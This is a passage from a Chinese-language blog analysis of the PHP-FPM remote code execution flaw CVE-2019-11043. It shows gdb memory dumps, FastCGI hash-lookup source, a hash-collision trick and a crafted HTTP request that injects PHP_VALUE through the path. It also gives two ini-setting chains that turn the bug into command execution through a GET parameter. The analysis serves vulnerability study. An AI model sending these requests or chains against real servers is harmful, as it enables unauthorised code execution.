<span class="string">"SERVER_PROTOCOL"</span></span><br><span class="line"><span class="number">0x56457251cf3c</span>:	<span class="string">"HTTP/1.1"</span></span><br><span class="line"><span class="number">0x56457251cf45</span>:	<span class="string">"REQUEST_SCHEME"</span></span><br><span class="line"><span class="number">0x56457251cf54</span>:	<span class="string">"http"</span></span><br><span class="line"><span class="number">0x56457251cf59</span>:	<span class="string">"SCRIPT_FILENAME"</span></span><br><span class="line"><span class="number">0x56457251cf69</span>:	<span class="string">"/var/www/html/index.php/PHP_VALUE\nsession.auto_start=1"</span></span><br><span class="line"><span class="number">0x56457251cfa0</span>:	<span class="string">"PATH_INFO"</span></span><br><span class="line"><span class="number">0x56457251cfaa</span>:	<span class="string">""</span>  								&lt;------------ env_path_info</span><br><span class="line"><span class="number">0x56457251cfab</span>:	<span class="string">"PATH_TRANSLATED"</span></span><br><span class="line"><span class="number">0x56457251cfbb</span>:	<span class="string">"/var/www/html"</span></span><br><span class="line"><span class="number">0x56457251cfc9</span>:	<span class="string">"HTTP_HOST"</span></span><br><span class="line"><span class="number">0x56457251cfd3</span>:	<span class="string">"localhost"</span></span><br><span class="line"><span class="number">0x56457251cfdd</span>:	<span class="string">"HTTP_USER_AGENT"</span></span><br><span class="line"><span class="number">0x56457251cfed</span>:	<span class="string">"curl/7.58.0"</span></span><br><span class="line"><span class="number">0x56457251cff9</span>:	<span class="string">"HTTP_ACCEPT"</span></span><br><span class="line"><span class="number">0x56457251d005</span>:	<span class="string">"*/*"</span>								&lt;------------ (&amp;h-&gt;data-&gt;pos)[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line"><span class="number">0x56457251d009</span>:	<span class="string">"HTTP_EBUT"</span></span><br><span class="line"><span class="number">0x56457251d013</span>:	<span class="string">"mamku tvoyu"</span></span><br><span class="line"><span class="number">0x56457251d01f</span>:	<span class="string">"ORIG_PATH_INFO"</span></span><br><span class="line"><span class="number">0x56457251d02e</span>:	<span class="string">""</span></span><br><span class="line"><span class="number">0x56457251d02f</span>:	<span class="string">""</span>									&lt;------------ h-&gt;data-&gt;pos</span><br></pre></td></tr></table></figure>
+
+<p>还有个问题，可控点是 orig_script_name 即 script_name，一旦我们需要更改这个值，env_path_info 到 pos 的偏移又会发生变化，又需要重新爆破？</p>
+<ul>
+<li><p>第一种办法</p>
+<p>  两者之间，<code>/index.php/PHP_VALUE\nsession.auto_start=1</code> 出现了四次，完全可以重新计算出偏移。</p>
+</li>
+<li><p>第二种办法</p>
+<p>  如果两者之间没有其他变量的存储了，那这个偏移一定是个定值，换句话来说，如果 path_info 是第一个写入的。恰好是这样的内存分布：</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_data_seg</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span>                  *pos;			<span class="comment">// 8个字节</span></span><br><span class="line">	<span class="keyword">char</span>                  *end;			<span class="comment">// 8个字节</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">fcgi_data_seg</span> *<span class="title">next</span>;</span>		<span class="comment">// 8个字节，指向前一个 fcgi_data_seg</span></span><br><span class="line">    -------------  <span class="comment">// char data[1];</span></span><br><span class="line">    PATH_INFO\x00</span><br><span class="line">    -------------  						<span class="comment">// 10个字节</span></span><br><span class="line">    \x00           						&lt;---- env_path_info</span><br><span class="line">&#125; fcgi_data_seg;</span><br></pre></td></tr></table></figure>
+
+<p>  从作者给的 PoC 中可以看到，他是疯狂填充 ，当写入 path_info 时恰好使一个 fcgi_data_seg 不够用，再 malloc 一个，这使 path_info 自然而然的成为了新 fcgi_data_seg 中第一个写入的。</p>
+<p>  怎么知道正好 malloc 呢？还是利用那个 memcpy，对一个非法地址写入时会 crash，返回 502。</p>
+<p>  稍微解释一下这个 crash，结合上面的内存分布，当偏移 34 字节时，path_info[0] = 0，就修改了 pos 的最低位的地址。如果少偏一点，比如 30 字节，那将把第五个字节置 0，这样指向的内存一般不能瞎写了。</p>
+  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/<span class="number">1</span>xg &amp;h-&gt;data-&gt;pos</span><br><span class="line"><span class="number">0x56457251ce00</span>:	<span class="number">0x000056457251d02f</span>  <span class="comment">// 34 =&gt; 0x000056457251d000</span></span><br><span class="line"><span class="number">0x56457251ce00</span>:	<span class="number">0x000056457251d02f</span>  <span class="comment">// 30 =&gt; 0x000056400251d02f</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>到这里，单字节写入提升为多字节指定写入了，写点什么好呢？继续。</p>
+<p>注意到这有个解析 PHP_VALUE 的过程，那么 RCE 快来了。XD</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fpm_main.c 1398</span></span><br><span class="line"><span class="comment">/* INI stuff */</span></span><br><span class="line">ini = FCGI_GETENV(request, <span class="string">"PHP_VALUE"</span>);</span><br><span class="line"><span class="keyword">if</span> (ini) &#123;</span><br><span class="line">    <span class="keyword">int</span> mode = ZEND_INI_USER;</span><br><span class="line">    <span class="keyword">char</span> *tmp;</span><br><span class="line">    spprintf(&amp;tmp, <span class="number">0</span>, <span class="string">"%s\n"</span>, ini);</span><br><span class="line">    zend_parse_ini_string(tmp, <span class="number">1</span>, ZEND_INI_SCANNER_NORMAL, (<span class="keyword">zend_ini_parser_cb_t</span>)fastcgi_ini_parser, &amp;mode);</span><br><span class="line">    efree(tmp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟一下这个宏。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FCGI_GETENV(request, name) \</span></span><br><span class="line">	fcgi_quick_getenv(request, name, <span class="keyword">sizeof</span>(name)<span class="number">-1</span>, FCGI_HASH_FUNC(name, <span class="keyword">sizeof</span>(name)<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fcgi_quick_getenv</span><span class="params">(fcgi_request *req, <span class="keyword">const</span> <span class="keyword">char</span>* var, <span class="keyword">int</span> var_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> hash_value)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> val_len;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> fcgi_hash_get(&amp;req-&gt;env, hash_value, (<span class="keyword">char</span>*)var, var_len, &amp;val_len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">fcgi_hash_get</span><span class="params">(fcgi_hash *h, <span class="keyword">unsigned</span> <span class="keyword">int</span> hash_value, <span class="keyword">char</span> *var, <span class="keyword">unsigned</span> <span class="keyword">int</span> var_len, <span class="keyword">unsigned</span> <span class="keyword">int</span> *val_len)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>      idx = hash_value &amp; FCGI_HASH_TABLE_MASK;</span><br><span class="line">	fcgi_hash_bucket *p = h-&gt;hash_table[idx];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (p-&gt;hash_value == hash_value &amp;&amp;</span><br><span class="line">		    p-&gt;var_len == var_len &amp;&amp;</span><br><span class="line">		    <span class="built_in">memcmp</span>(p-&gt;var, var, var_len) == <span class="number">0</span>) &#123;</span><br><span class="line">		    *val_len = p-&gt;val_len;</span><br><span class="line">		    <span class="keyword">return</span> p-&gt;val;</span><br><span class="line">		&#125;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到这里，hashtable 的作用发挥出来了，先以 hash_value 为索引查一下，再比较 var 的值是否相同，很严格。</p>
+<p>要想写进去的 PHP_VALUE 能用起来的话，还有个问题没有解决，hash_value 对不上，曲线救国！</p>
+<p>整理一下我们现在有哪些条件了：</p>
+<ul>
+<li>hash_value 的计算很简单，非常容易产生一样的值。</li>
+<li>对在 fcgi_data_seg 中存储的参数可以直接写入或者覆盖。 </li>
+</ul>
+<p>利用哈希函数的缺陷，先搞一个进哈希表，去占个位，再通过 memcpy 进行更名。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">FCGI_HASH</span><span class="params">(<span class="string">"HTTP_EBUT"</span>)</span></span> == FCGI_HASH(<span class="string">"PHP_VALUE"</span>) == <span class="number">2015</span></span><br><span class="line"><span class="function"><span class="title">strlen</span><span class="params">(<span class="string">"HTTP_EBUT"</span>)</span></span> == strlen(<span class="string">"PHP_VALUE"</span>) == <span class="number">9</span></span><br></pre></td></tr></table></figure>
+
+<p>怎么知道多久才覆盖成功了？写入 session.auto_start=1。</p>
+<p>当服务器返回 <code>Set-Cookie</code> 头的时候，就说明了 <code>PHP_VALUE</code> 覆盖成功了。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php/PHP_VALUE%0Asession.auto_start=1;;;?QQQQQQQQQQQQQQQQQQQQQ....</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0</span><br><span class="line"><span class="attribute">D-Pisos</span>: 8===========================================================D</span><br><span class="line"><span class="attribute">Ebut</span>: mamku tvoyu</span><br></pre></td></tr></table></figure>
+
+<p>其中 D-Pisos 是拿来调节位置的，结合上面打印的 request-&gt;env-&gt;data 内存更容易看清楚。</p>
+<p>另外，我觉得 PHP_VALUE 的值可以直接从 Ebut 写入，只要把 HTTP_EBUT 换成 PHP_VALUE，不用整个覆盖。</p>
+<p><strong>怎么 RCE？</strong></p>
+<p>作者想到了这样的一条链，进一步的实现细节建议直接去看作者的 <a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">exp</a>。</p>
+<p>需要注意的是，为了将空字节准确地放置在地址中，偏移的值固定为 34，所以不能超过，少了就用 <code>;</code> 填充。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> chain = []<span class="keyword">string</span>&#123;</span><br><span class="line">    <span class="string">"short_open_tag=1"</span>, 			<span class="comment">// 开启php短标签</span></span><br><span class="line">    <span class="string">"html_errors=0"</span>,   				<span class="comment">// 在错误信息中关闭HTML标签</span></span><br><span class="line">    <span class="string">"include_path=/tmp"</span>,  			<span class="comment">// 包含路径</span></span><br><span class="line">    <span class="string">"auto_prepend_file=a"</span>,  		<span class="comment">// 指定脚本执行前自动包含的文件</span></span><br><span class="line">    <span class="string">"log_errors=1"</span>,  				<span class="comment">// 使能错误日志</span></span><br><span class="line">    <span class="string">"error_reporting=2"</span>,   			<span class="comment">// 指定错误级别</span></span><br><span class="line">    <span class="string">"error_log=/tmp/a"</span>,  			<span class="comment">// 错误日志记录文件</span></span><br><span class="line">    <span class="string">"extension_dir=\"&lt;?=\`\""</span>,   	<span class="comment">// 指定extension的加载目录</span></span><br><span class="line">    <span class="string">"extension=\"$_GET[a]\`?&gt;\""</span>, 	<span class="comment">// 指定加载的extension</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>orange 给了这样的链。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">inis = [</span><br><span class="line">    <span class="string">"error_reporting=2"</span>,</span><br><span class="line">    <span class="string">"short_open_tag=1"</span>,</span><br><span class="line">    <span class="string">"html_errors=0"</span>,</span><br><span class="line">    <span class="string">"log_errors=1"</span>,</span><br><span class="line">    <span class="string">"output_handler=&lt;?/*"</span>,</span><br><span class="line">    <span class="string">"output_handler=*/`"</span>,</span><br><span class="line">    <span class="string">"output_handler=''"</span>,</span><br><span class="line">    <span class="string">"extension_dir='`?&gt;'"</span>,</span><br><span class="line">    <span class="string">"extension=$_GET[a]"</span>,</span><br><span class="line">    <span class="string">"error_log  = /tmp/l"</span>,</span><br><span class="line">    <span class="string">"include_path=/tmp"</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一步一步深挖，直到 RCE。真是化腐朽为神奇，钦佩这样的技术大佬。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://bugs.php.net/bug.php?id=78599" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78599</a></p>
+<p><a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">https://github.com/neex/phuip-fpizdam</a></p>
+<p><a href="https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/" target="_blank" rel="noopener">https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/</a></p>
+<p><a href="https://blog.orange.tw/2019/10/an-analysis-and-thought-about-recently.html" target="_blank" rel="noopener">https://blog.orange.tw/2019/10/an-analysis-and-thought-about-recently.html</a></p>
+<p><a href="https://blog.wonderkun.cc/2019/10/27/php-fpm" target="_blank" rel="noopener">https://blog.wonderkun.cc/2019/10/27/php-fpm</a> RCE的POC的理解剖析(CVE-2019-11043)/</p>
+<p><a href="https://coding.imooc.com/class/312.html" target="_blank" rel="noopener">https://coding.imooc.com/class/312.html</a></p>
+<p><a href="https://segmentfault.com/a/1190000016868502" target="_blank" rel="noopener">https://segmentfault.com/a/1190000016868502</a></p>
+<p><a href="https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/" target="_blank" rel="noopener">https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://wywwzjj.top">wywwzjj</a>
+            </p><p>原文链接：<a href="https://wywwzjj.top/2020/01/23/PHP-FPM-RCE/">https://wywwzjj.top/2020/01/23/PHP-FPM-RCE/</a>
+            </p><p>发表日期：<a href="https://wywwzjj.top/2020/01/23/PHP-FPM-RCE/">January 23rd 2020, 11:05:54 pm</a>
+            </p><p>更新日期：<a href="https://wywwzjj.top/2020/01/23/PHP-FPM-RCE/">February 11th 2020, 11:59:07 am</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2020/01/24/Go-学习/" title="Go 学习">
+                    <div class="nextTitle">Go 学习</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2020/01/17/ThinkPHP-6.0-任意文件写入/" title="ThinkPHP 6.0 任意文件写入">
+                    <div class="prevTitle">ThinkPHP 6.0 任意文件写入</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="//github.com/wywwzjj" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title="qq">
+                  
+                  <img class="profile-qr" src="/assets/QQ.png">
+                </span>
+            
+        
+    
+        
+    
+        
+            
+                <a href="mailto:wywwzjj@gmail.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        
+        
+        <span id="busuanzi_container_site_pv" class="theme-info">
+            |&nbsp;&nbsp;总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>&nbsp;&nbsp;次
+        </span>
+        <span id="busuanzi_container_site_uv" class="theme-info">
+            &nbsp;&nbsp;|&nbsp;&nbsp;访客数&nbsp;<span id="busuanzi_value_site_uv"></span>&nbsp;&nbsp;人次&nbsp;&nbsp;|
+        </span>
+        <!-- <span id="busuanzi_container_site_pv">阅读次数: <span id="busuanzi_value_site_pv"></span> : )</span> -->
+        
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#编译-PHP"><span class="toc-number">2.1.</span> <span class="toc-text">编译 PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#配置-fpm"><span class="toc-number">2.2.</span> <span class="toc-text">配置 fpm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#配置-nginx"><span class="toc-number">2.3.</span> <span class="toc-text">配置 nginx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#启动-fpm"><span class="toc-number">2.4.</span> <span class="toc-text">启动 fpm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CLion-调试"><span class="toc-number">2.5.</span> <span class="toc-text">CLion 调试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现"><span class="toc-number">3.</span> <span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FPM-生命周期"><span class="toc-number">4.</span> <span class="toc-text">FPM 生命周期</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FastCGI-协议"><span class="toc-number">5.</span> <span class="toc-text">FastCGI 协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#相关结构体"><span class="toc-number">5.1.</span> <span class="toc-text">相关结构体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#抓包分析"><span class="toc-number">5.2.</span> <span class="toc-text">抓包分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FPM-如何将参数提取出来？"><span class="toc-number">5.3.</span> <span class="toc-text">FPM 如何将参数提取出来？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-number">6.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#异常出现"><span class="toc-number">6.1.</span> <span class="toc-text">异常出现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#找寻原因"><span class="toc-number">6.2.</span> <span class="toc-text">找寻原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#单字节写入"><span class="toc-number">6.3.</span> <span class="toc-text">单字节写入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FCGI-PUTENV"><span class="toc-number">6.4.</span> <span class="toc-text">FCGI_PUTENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#扩大攻击面"><span class="toc-number">6.5.</span> <span class="toc-text">扩大攻击面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-number">6.6.</span> <span class="toc-text">RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">8.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 51
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2020/01/30/ThinkPHP-3-X-5-X-order-by-注入/">ThinkPHP 3.X / 5.X order by 注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/24</span><a class="archive-post-title" href="/2020/01/24/Go-学习/">Go 学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span><a class="archive-post-title" href="/2020/01/23/PHP-FPM-RCE/">PHP-FPM RCE (CVE-2019-11043)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/17</span><a class="archive-post-title" href="/2020/01/17/ThinkPHP-6.0-任意文件写入/">ThinkPHP 6.0 任意文件写入</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/16</span><a class="archive-post-title" href="/2019/12/16/CSAPP-Chapter-12-Notes/">CSAPP 并发编程 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/15</span><a class="archive-post-title" href="/2019/12/15/smarty-3.1.31-RCE/">smarty 3.1.31 RCE（CVE-2017-1000480）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/02</span><a class="archive-post-title" href="/2019/12/02/CSAPP-Chapter-11-Notes/">CSAPP 网络编程 笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span><a class="archive-post-title" href="/2019/11/25/CSAPP-Chapter-10-Notes/">CSAPP 系统级 IO 笔记</a>
+        </li>
+    
+    
